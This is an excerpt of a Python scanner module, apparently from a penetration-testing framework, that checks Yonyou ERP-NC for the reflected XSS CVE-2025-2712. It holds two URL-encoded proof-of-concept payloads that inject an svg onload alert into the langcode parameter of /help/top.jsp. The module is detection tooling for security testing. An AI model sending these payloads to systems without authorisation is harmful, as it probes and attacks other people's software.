...
class Module(Scanner, Http_client):
    __info__ = {
        ...
        'severity': 'medium',
        'tags': ['web', 'scanner', 'cve', 'cve2025', 'xss', 'erp-nc', 'ufida', 'yonyou', 'vkev', 'vuln'],
        'agent': {
            'risk': 'active',
        ...
        'references': ['https://nvd.nist.gov/vuln/detail/CVE-2025-2712'],
        'cve': 'CVE-2025-2712',
    }

    def run(self):
        for path in ('/help/top.jsp?langcode=1%22%3E%3Csvg%20onload=alert(document.domain)%3E', '/help/top.jsp?langcode=1%22%3E%3C/script%3E%3Csvg%20onload=alert(document.domain)%3E'):
